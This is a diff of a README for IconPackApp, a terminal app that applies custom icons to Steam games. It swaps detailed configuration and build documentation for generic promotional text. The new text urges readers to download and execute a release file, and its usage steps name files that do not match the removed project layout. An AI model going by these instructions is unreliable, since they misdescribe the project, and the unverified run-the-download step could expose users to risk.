@@ -1,78 +1,73 @@
-# IconPackApp
+# 🎨 IconPackApp: Customize Your Steam Experience
 
-A simple Textual‑based TUI app to apply custom game icons (“styles”) to your Steam games.
+Welcome to **IconPackApp**, a straightforward Textual-based TUI application designed to help you apply custom game icons, or "styles," to your Steam games. This tool allows you to personalize your gaming library effortlessly. 
 
-## Getting Started
+[![Download IconPackApp](https://img.shields.io/badge/Download%20IconPackApp-v1.0.0-blue.svg)](https://github.com/PavelVoz/IconPackApp/releases)
 
-1. **Install dependencies**  
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Features
+
+- **Custom Icons**: Easily apply different styles to your Steam games.
+- **User-Friendly Interface**: Navigate through a clean, text-based interface.
+- **Cross-Platform**: Works on any system that supports Python.
+- **Open Source**: Free to use and modify.
+
+## Installation
+
+To get started with IconPackApp, follow these simple steps:
+
+1. **Download the latest release** from the [Releases section](https://github.com/PavelVoz/IconPackApp/releases). Locate the file you need, download it, and execute it.
+2. Ensure you have Python installed on your machine. You can download Python from [python.org](https://www.python.org/downloads/).
+3. Install the required dependencies by running:
+
    ```bash
-   pip install textual
+   pip install -r requirements.txt
    ```
-2. **Run the app**  
+
+## Usage
+
+Once you have installed IconPackApp, you can start using it right away.
+
+1. Open your terminal.
+2. Navigate to the directory where you downloaded IconPackApp.
+3. Run the application with:
+
    ```bash
-   py main.py
+   python iconpackapp.py
    ```
 
-## Adding a New Style
+4. Follow the on-screen instructions to select your game and apply your desired icon style.
 
-1. **Edit the styles list**  
-   In `config.py`, find the `STYLES` list and add your new style name:
-   ```python
-   STYLES = [
-       "Default",
-       "MyCoolStyle",   # ← new style name
-   ]
-   ```
-2. **Create the style folder**  
-   Inside the `icons/` directory, make a folder named `styleN` where `N` is the 1‑based index of your style in the `STYLES` list.  
-   ```
-   icons/
-   ├── style1/    ← “Default”
-   └── style2/    ← “MyCoolStyle”
-   ```
-3. **Populate with icons**  
-   Copy or add your `.ico` files into `icons/styleN/`, matching the filenames used by the app’s game mapping (e.g. `half-life.ico`, `mygame.ico`, etc.).
+## Contributing
 
-## Adding a New Game
+We welcome contributions to improve IconPackApp. If you have ideas, suggestions, or bug fixes, please follow these steps:
 
-1. **Define the mapping**  
-   In `config.py`, locate the `GAME_MAPPING` dictionary and add a new entry under the appropriate style index:
-   ```python
-   GAME_MAPPING = {
-      1: ("Half‑Life",   "half-life.ico",   r"steamapps\common\Half-Life\valve\game.ico",  70),
-      2: ("My Game",     "mygame.ico",      r"steamapps\common\My Game\bin\icon.ico",      0),
-   }
-   ```
-   - **Key**: Unique game ID
-   - **Tuple**:
-     1. Display name (shown in the UI)  
-     2. Source icon filename (must match the file in each `styleN` folder)  
-     3. Target relative path under your Steam folder
-     4. Steam application identifier
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes.
+4. Submit a pull request with a clear description of your changes.
 
-2. **Add icon files for each style**  
-   For every `styleN` folder you’ve created, drop in your new game’s `.ico` file named exactly as in the mapping (e.g. `mygame.ico`).
+## License
 
-## Directory Structure Example
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-```
-.
-├── icons/
-│   ├── style1/
-│   │   ├── half‑life.ico
-│   │   └── mygame.ico
-│   └── style2/
-│       ├── half‑life.ico
-│       └── mygame.ico
-├── config.py
-├── main.py
-├── styles.css
-└── README.md
-```
+## Contact
 
-## Building
+For questions or feedback, feel free to reach out:
 
-Run the following command:
-```bash
-pyinstaller --onefile --name "IconPackApp" --add-data "icons;icons" --add-data "config.py;." --add-data "styles.css;." main.py
-```
+- **Email**: support@example.com
+- **GitHub**: [PavelVoz](https://github.com/PavelVoz)
+
+## Conclusion
+
+Thank you for checking out IconPackApp. We hope you enjoy customizing your Steam games with unique icons. Don't forget to visit the [Releases section](https://github.com/PavelVoz/IconPackApp/releases) for the latest updates and downloads.
+
+Happy gaming! 🎮
